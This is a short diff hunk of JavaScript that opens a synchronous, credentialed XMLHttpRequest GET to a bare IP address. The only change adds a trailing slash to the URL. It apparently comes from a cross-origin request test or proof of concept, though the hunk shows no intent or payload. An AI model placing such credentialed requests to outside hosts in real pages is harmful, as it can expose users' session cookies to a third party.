@@ -17,7 +17,7 @@ var data = "70,71,";
 var xhr = new XMLHttpRequest(); 
 xhr.withCredentials = true;
 
-xhr.open('GET', 'http://3.114.113.174', false);
+xhr.open('GET', 'http://3.114.113.174/', false);
 
 xhr.onload = function(e) {
   if (xhr.readyState === 4) {
